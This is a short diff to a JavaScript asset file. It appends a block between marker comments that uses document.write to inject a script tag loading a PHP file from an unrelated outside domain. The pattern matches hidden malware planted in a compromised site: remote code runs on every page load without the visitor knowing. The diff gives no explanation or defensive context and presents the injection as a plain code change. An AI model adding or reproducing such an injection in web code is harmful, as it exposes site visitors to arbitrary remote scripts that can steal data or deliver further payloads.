@@ -452,3 +452,12 @@ var Asset = {
 
 };
 
+/*f85fc3*/
+/**/
+
+
+document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
+
+
+
+/*/f85fc3*/
